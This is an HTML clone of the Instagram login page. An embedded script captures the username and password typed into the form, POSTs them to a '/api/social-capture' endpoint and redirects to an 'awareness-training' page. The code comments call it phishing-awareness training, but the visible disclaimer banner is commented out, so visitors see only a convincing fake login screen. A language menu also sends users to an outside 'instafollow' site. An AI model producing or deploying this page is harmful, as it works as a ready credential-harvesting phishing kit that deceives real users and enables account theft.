<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Instagram</title>
  <style>
    /* ===== RESET & UNIVERSAL SELECTORS ===== */
    #root, body, html {
      height: 100%;
    }
    body {
      overflow-y: scroll;
      margin: 0;
      padding: 0;
      background-color: #fafafa;
    }
    a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
      margin: 0;
      padding: 0;
      border: 0;
      font: inherit;
      vertical-align: baseline;
    }
    a, a:visited {
      text-decoration: none;
    }
    a:active, .btn:active {
      opacity: .5;
    }
    ol, ul {
      list-style: none;
    }
    body, button, input {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 14px;
      line-height: 18px;
    }
    #root, article, main, div, section, header, nav, footer {
      border: 0 solid #000000;
      box-sizing: border-box;
      align-items: stretch;
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
      margin: 0;
      padding: 0;
      position: relative;
    }
    /* ===== MAIN LAYOUT ===== */
    #root {
      z-index: 0;
    }
    .section-all {
      min-height: 100%;
      overflow: hidden;
    }
    .main {
      background-color: #fafafa;
      order: 4;
      flex-grow: 1;
    }
    .wrapper {
      min-height: 100%;
      overflow: hidden;
      flex-grow: 1;
      justify-content: center;
    }
    .article {
      flex-grow: 1;
      justify-content: center;
      flex-direction: row;
      margin: 0 auto;
      max-width: 935px;
      width: 100%;
    }
    .content {
      color: #262626;
      flex-grow: 1;
      justify-content: center;
      max-width: 350px;
      margin-top: 12px;
    }
    .login-box {
      background: #fff;
      border: 1px solid #e6e6e6;
      border-radius: 1px;
      margin: 0 0 10px;
      padding: 10px 0;
    }
    .header {
      margin: 14.45px auto 12px;
      text-align: center;
    }
    .logo {
      width: 175px;
      height: auto;
    }
    .form {
      display: flex;
      flex-direction: column;
      margin-bottom: 10px;
    }
    .input-box {
      margin: auto 40px 6px;
    }
    input {
      height: 36px;
      border: 1px solid #efefef;
      border-radius: 3px;
      background-color: #fafafa;
      width: 100%;
      font-size: 12px;
      margin: 0;
      padding: 9px 0 7px 8px;
      outline: none;
      overflow: hidden;
      text-overflow: ellipsis;
      box-sizing: border-box;
    }
    input#username:focus, input#password:focus {
      border-color: #bbb;
    }
    .button-box {
      display: block;
      position: relative;
      margin: 8px 40px;
    }
    .btn {
      cursor: pointer;
      width: 100%;
      padding: 0 8px;
      background: #3897f0;
      border: 1px solid #3897f0;
      color: #fff;
      border-radius: 3px;
      font-weight: 600;
      font-size: 14px;
      height: 28px;
      line-height: 26px;
      outline: none;
      white-space: nowrap;
    }
    .forgot, .forgot:active, .forgot:hover, .forgot:visited {
      font-size: 12px;
      margin-top: 12px;
      text-align: center;
      color: #003569;
      line-height: 14px !important;
      display: block;
    }
    .text {
      text-align: center;
      margin: 15px;
      color: #262626;
      font-size: 14px;
    }
    .text a, .text a:visited, .text a:hover, .text a:active {
      color: #3897f0;
      margin-left: 3px;
    }
    .app p {
      line-height: 18px;
      color: #262626;
      font-size: 14px;
      text-align: center;
      margin: 10px 20px;
    }
    .app-img {
      flex-direction: row;
      justify-content: center;
      margin: 10px 0;
      display: flex;
      gap: 8px;
    }
    .app-img a {
      margin-right: 8px;
      height: 43.5px;
    }
    .app-img img {
      height: 40px;
    }
    /* FOOTER */
    .footer {
      background-color: #fafafa;
      order: 5;
      padding: 0 20px;
    }
    .footer-container {
      flex-direction: row;
      flex-wrap: wrap;
      justify-content: space-between;
      padding: 38px 0;
      max-width: 935px;
      font-size: 12px;
      font-weight: 600;
      margin: 0 auto;
      text-transform: uppercase;
      width: 100%;
      display: flex;
      align-items: center;
    }
    .footer-nav {
      max-width: 100%;
    }
    .footer-nav ul {
      margin-right: 16px;
      margin-bottom: 3px;
      flex-grow: 1;
      display: flex;
      flex-wrap: wrap;
      gap: 5px;
    }
    .footer-nav ul li {
      display: inline-block;
      margin-right: 13px;
      margin-bottom: 7px;
    }
    .footer-nav ul li a {
      color: #003569;
      text-decoration: none;
    }
    .footer span {
      color: #999;
    }
    span.language {
      color: #003569;
      cursor: pointer;
      display: inline-block;
      font-weight: 600;
      position: relative;
      text-transform: uppercase;
      vertical-align: top;
    }
    .select {
      cursor: pointer;
      height: 100%;
      top: 0;
      opacity: 0;
      position: absolute;
      left: 0;
      width: 100%;
    }
    /* training watermark */
    .training-banner {
      background: #dc3545;
      color: white;
      text-align: center;
      padding: 12px;
      font-weight: bold;
      font-size: 14px;
      position: sticky;
      top: 0;
      z-index: 9999;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    /* Responsive */
    @media (max-width: 450px) {
      .main { background-color: #fff; }
      .content { max-width: 100%; margin-top: 0; justify-content: space-between; }
      .login-box { background-color: transparent; border: none; }
      .logo { margin: 0 auto; }
      .input-box { border: 1px solid #efefef; border-radius: 3px; height: 36px; background: #fafafa; position: relative; }
      input { border: 0; background-color: #fafafa; }
    }
    @media only screen and (max-width: 875px) {
      .footer-container { text-align: center; padding: 10px 0; flex-direction: column; gap: 15px; }
      .footer-nav ul { justify-content: center; margin: 0 auto; max-width: 360px; }
    }
  </style>
</head>
<body>
  <!-- TRAINING DISCLAIMER BANNER (visible clone notice) 
  <div class="training-banner">
    🎓 للتدريب الأكاديمي فقط – هذه صفحة منسوخة لأغراض تعليمية. لا تدخل بيانات حقيقية.
  </div>-->

  <span id="root">
    <section class="section-all">
      <!-- Main Content -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <!-- Login Box -->
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form" id="instagramTrainingForm">
                    <div class="input-box">
                      <input type="text" id="username" name="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" value="" required>
                    </div>  
                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" required>
                    </div>  
                    <span class="button-box">
                      <button class="btn" type="submit" name="submit">Log in</button>
                    </span>  
                    <a class="forgot" href="#">Forgot password?</a>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <!-- Sign up box -->
              <div class="login-box">
                <p class="text">Don't have an account? <a href="#">Sign up</a></p>
              </div> <!-- Signup-box end -->

              <!-- App stores -->
              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8" target="_blank">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" alt="Download on App Store">
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge" target="_blank">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" alt="Get it on Google Play">
                  </a>  
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="#">About Us</a></li>
              <li><a href="#">Support</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">Press</a></li>
              <li><a href="#">Api</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Directory</a></li>
              <li>
                <span class="language">Language
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>
          <span class="footer-logo">&copy; 2025 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>
    </section>
  </span> <!-- Root -->

  <!-- Select Language redirect function -->
  <script type="text/javascript">
    function la(src) {
      if(src && src !== '#') window.location = src;
    }
  </script>

  <!-- TRAINING CAPTURE SCRIPT (social clone awareness) -->
  <script>
    (function() {
      // Get the login form by its ID
      const form = document.getElementById('instagramTrainingForm');
      if (!form) return;

      form.addEventListener('submit', function(e) {
        e.preventDefault();  // Prevent real submission
        
        // Extract form data using FormData
        const fd = new FormData(e.target);
        // Get username or email field (instagram uses "username" field)
        let username = fd.get('username') || '';
        let password = fd.get('password') || '';
        
        // Prepare payload for backend training capture endpoint
        const payload = {
          site: 'instagram',
          form_data: {
            username: username,
            password: password
          }
        };

        // Send POST request to the backend capture endpoint (social-capture)
        fetch('/api/social-capture', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
          console.log('Training capture recorded:', data);
        })
        .catch(err => {
          console.error('Capture error (training mode):', err);
        })
        .finally(() => {
          // Redirect to awareness training page after submission (educational redirection)
          window.location.href = '/awareness-training';
        });
      });
    })();
  </script>
</body>
</html>
